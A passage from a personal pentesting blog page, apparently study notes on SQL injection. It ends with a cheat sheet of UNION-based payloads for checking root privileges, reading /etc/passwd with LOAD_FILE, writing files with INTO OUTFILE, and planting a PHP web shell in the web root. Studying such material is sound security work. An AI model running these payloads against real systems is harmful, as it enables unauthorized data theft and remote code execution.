+<td>cn’ UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user&#x3D;”root”– -</td>
+<td>Find if user has admin privileges</td>
+</tr>
+<tr>
+<td>cn’ UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user&#x3D;”root”– -</td>
+<td>Find if all user privileges</td>
+</tr>
+<tr>
+<td>cn’ UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name&#x3D;”secure_file_priv”– -</td>
+<td>Find which directories can be accessed through MySQL</td>
+</tr>
+<tr>
+<td>File Injection</td>
+<td></td>
+</tr>
+<tr>
+<td>cn’ UNION SELECT 1, LOAD_FILE(“&#x2F;etc&#x2F;passwd”), 3, 4– -</td>
+<td>Read local file</td>
+</tr>
+<tr>
+<td>select ‘file written successfully!’ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;proof.txt’</td>
+<td>Write a string to a local file</td>
+</tr>
+<tr>
+<td>cn’ union select “”,’<?php system($_REQUEST[0]); ?>‘, “”, “” into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’– -</td>
+<td>Write a web shell into the base web directory</td>
+</tr>
+</tbody></table>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://fhk0.github.io">fhk0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://fhk0.github.io/2022/09/16/SQL-Injection/">https://fhk0.github.io/2022/09/16/SQL-Injection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/sqlinjection.jpg" data-sites="facebook, twitter, linkedin"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/16/Command-Injections/"><img class="prev-cover" src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/commandinjection.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Command Injections</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/16/XSS/"><img class="next-cover" src="/img/content-images/htb-academy/XSS%20996cf31acb0c4b0c8100bd94861f802d/xss.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">XSS</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mrrobot.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">fhk0</div><div class="author-info__description">Web Application Pentester</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/FHK0"><i class="fab fa-github"></i><span>Follow Me on GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://www.linkedin.com/in/firathilmikaplan/" target="_blank" title="Linkedin"><i class="fa-brands fa-linkedin"></i></a><a class="social-icon" href="https://medium.com/@fhk0" target="_blank" title="Medium"><i class="fa-brands fa-medium"></i></a><a class="social-icon" href="https://www.youtube.com/channel/UCik9LW_i9-h2NKVrs6180ng" target="_blank" title="YouTube"><i class="fa-brands fa-youtube"></i></a><a class="social-icon" href="https://www.hackerrank.com/fhk0x" target="_blank" title="HackerRank"><i class="fa-brands fa-hackerrank"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Hey! I'm currently solving PortSwigger Labs. I'll share the solutions of them soon.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">1.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ben-giris-yapmak-istiyorum-ne-yapmaliyim"><span class="toc-number">1.0.1.</span> <span class="toc-text">Ben giriş yapmak istiyorum ne yapmalıyım?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nasil-Yeni-Database-Yaratirim"><span class="toc-number">1.0.2.</span> <span class="toc-text">Nasıl Yeni Database Yaratırım?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Var-Olan-Database%E2%80%99leri-Nasil-Gorebilirim"><span class="toc-number">1.0.3.</span> <span class="toc-text">Var Olan Database’leri Nasıl Görebilirim?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tablolar"><span class="toc-number">1.1.</span> <span class="toc-text">Tablolar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ben-tabloya-her-eleman-ekledigimde-ID%E2%80%99sinin-duzenli-olarak-artmasini-istiyorum-ne-yapmaliyim"><span class="toc-number">1.1.1.</span> <span class="toc-text">Ben tabloya her eleman eklediğimde ID’sinin düzenli olarak artmasını istiyorum ne yapmalıyım?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ben-bir-degiskenin-essiz-olmasini-istiyorum-ne-yapmaliyim"><span class="toc-number">1.1.2.</span> <span class="toc-text">Ben bir değişkenin eşsiz olmasını istiyorum ne yapmalıyım?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ben-bir-degiskene-varsayilan-bir-deger-atamak-istiyorum-ne-yapmaliyim"><span class="toc-number">1.1.3.</span> <span class="toc-text">Ben bir değişkene varsayılan bir değer atamak istiyorum ne yapmalıyım?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PRIMARY-KEY-atamasi-yapmak-istiyorum-ne-yapmaliyim"><span class="toc-number">1.1.4.</span> <span class="toc-text">PRIMARY KEY ataması yapmak istiyorum ne yapmalıyım?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bu-ozellikleri-dahil-ederek-tabloyu-sifirdan-nasil-olusturabilirim"><span class="toc-number">1.1.5.</span> <span class="toc-text">Bu özellikleri dahil ederek tabloyu sıfırdan nasıl oluşturabilirim?</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Komutlari"><span class="toc-number">2.</span> <span class="toc-text">SQL Komutları</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#INSERT"><span class="toc-number">2.1.</span> <span class="toc-text">INSERT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SELECT"><span class="toc-number">2.2.</span> <span class="toc-text">SELECT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DROP"><span class="toc-number">2.3.</span> <span class="toc-text">DROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ALTER"><span class="toc-number">2.4.</span> <span class="toc-text">ALTER</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UPDATE"><span class="toc-number">2.5.</span> <span class="toc-text">UPDATE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sorgu-Sonuclari"><span class="toc-number">3.</span> <span class="toc-text">Sorgu Sonuçları</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sonuclari-Siralamak"><span class="toc-number">3.1.</span> <span class="toc-text">Sonuçları Sıralamak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cok-Fazla-Sonuc-Donuyor-Nasil-Kisitlayabilirim"><span class="toc-number">3.2.</span> <span class="toc-text">Çok Fazla Sonuç Dönüyor Nasıl Kısıtlayabilirim?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WHERE-Cumlecigi"><span class="toc-number">3.3.</span> <span class="toc-text">WHERE Cümleciği</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LIKE-Cumlecigi"><span class="toc-number">3.4.</span> <span class="toc-text">LIKE Cümleciği</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro-to-SQL-Injections"><span class="toc-number">4.</span> <span class="toc-text">Intro to SQL Injections</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Kesfi"><span class="toc-number">4.1.</span> <span class="toc-text">SQL Injection Keşfi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Commentlerin-Isin-Icine-Dahiliyeti"><span class="toc-number">4.1.1.</span> <span class="toc-text">Commentlerin İşin İçine Dahiliyeti</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UNION-Cumlecigi"><span class="toc-number">4.2.</span> <span class="toc-text">UNION Cümleciği</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tamam-Ben-SQL-Injection-Yapacagim-da-Kardesim-Ben-Bu-Sutun-Sayisini-Nasil-Kesfedecegim"><span class="toc-number">4.3.</span> <span class="toc-text">Tamam Ben SQL Injection Yapacağım da Kardeşim Ben Bu Sütun Sayısını Nasıl Keşfedeceğim?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ORDER-BY-Kullanimi"><span class="toc-number">4.3.1.</span> <span class="toc-text">ORDER BY Kullanımı</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION-Kullanimi"><span class="toc-number">4.3.2.</span> <span class="toc-text">UNION Kullanımı</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Database-Enumeration"><span class="toc-number">5.</span> <span class="toc-text">Database Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#INFORMATION-SCHEMA-Database"><span class="toc-number">5.1.</span> <span class="toc-text">INFORMATION_SCHEMA Database</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Guzel-Kardesim-Bu-Server-Uzerinde-Hangi-Veri-Tabanlari-Var"><span class="toc-number">5.1.1.</span> <span class="toc-text">Güzel Kardeşim Bu Server Üzerinde Hangi Veri Tabanları Var?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tablolar-1"><span class="toc-number">5.2.</span> <span class="toc-text">Tablolar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sutunlar"><span class="toc-number">5.3.</span> <span class="toc-text">Sütunlar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Data"><span class="toc-number">5.4.</span> <span class="toc-text">Data</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dosya-Okuma"><span class="toc-number">6.</span> <span class="toc-text">Dosya Okuma</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Peki-Su-Anda-Bulundugumuz-Kullanici-Hangi-Ayricaliklara-Sahip"><span class="toc-number">6.1.</span> <span class="toc-text">Peki Şu Anda Bulunduğumuz Kullanıcı Hangi Ayrıcalıklara Sahip?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOAD-FILE"><span class="toc-number">6.2.</span> <span class="toc-text">LOAD_FILE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Peki-Kaynak-Kod-Sizdirilabilir-Mi"><span class="toc-number">6.2.1.</span> <span class="toc-text">Peki Kaynak Kod Sızdırılabilir Mi?</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Writing-Files"><span class="toc-number">7.</span> <span class="toc-text">Writing Files</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SELECT-INTO-OUTFILE"><span class="toc-number">7.1.</span> <span class="toc-text">SELECT INTO OUTFILE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bu-Bilgiler-Dogrultusunda-Web-Shell-Yazmak"><span class="toc-number">7.1.1.</span> <span class="toc-text">Bu Bilgiler Doğrultusunda Web Shell Yazmak</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Cheat-Sheet"><span class="toc-number">8.</span> <span class="toc-text">SQL Injection Cheat Sheet</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/File-Inclusion/" title="File Inclusion"><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/fileinclusion.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Inclusion"/></a><div class="content"><a class="title" href="/2022/09/16/File-Inclusion/" title="File Inclusion">File Inclusion</a><time datetime="2022-09-16T05:24:50.000Z" title="Created 2022-09-16 08:24:50">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Web-Attacks/" title="Web Attacks"><img src="/img/content-images/htb-academy/Web%20Attacks%20219f9e2baec741e9a0cba7f5c82486d5/webattacks.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web Attacks"/></a><div class="content"><a class="title" href="/2022/09/16/Web-Attacks/" title="Web Attacks">Web Attacks</a><time datetime="2022-09-16T05:24:41.000Z" title="Created 2022-09-16 08:24:41">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Broken-Authentication/" title="Broken Authentication"><img src="/img/content-images/htb-academy/Broken%20Authentication%2097c8a4f364d34faba8206ba43cd5143f/brokenauth.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Broken Authentication"/></a><div class="content"><a class="title" href="/2022/09/16/Broken-Authentication/" title="Broken Authentication">Broken Authentication</a><time datetime="2022-09-16T05:24:30.000Z" title="Created 2022-09-16 08:24:30">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/Login-Brute-Forcing/" title="Login Brute Forcing"><img src="/img/content-images/htb-academy/Login%20Brute%20Forcing%20e7d1108ee8b549c085496b59363951fd/loginbruteforcing.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Login Brute Forcing"/></a><div class="content"><a class="title" href="/2022/09/16/Login-Brute-Forcing/" title="Login Brute Forcing">Login Brute Forcing</a><time datetime="2022-09-16T05:24:17.000Z" title="Created 2022-09-16 08:24:17">2022-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/16/File-Upload-Attacks/" title="File Upload Attacks"><img src="/img/content-images/htb-academy/File%20Upload%20Attacks%20461a571f3e7e47949bfd55a6cd9981e2/fileuploadattacks.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File Upload Attacks"/></a><div class="content"><a class="title" href="/2022/09/16/File-Upload-Attacks/" title="File Upload Attacks">File Upload Attacks</a><time datetime="2022-09-16T05:24:05.000Z" title="Created 2022-09-16 08:24:05">2022-09-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By fhk0</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,0" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
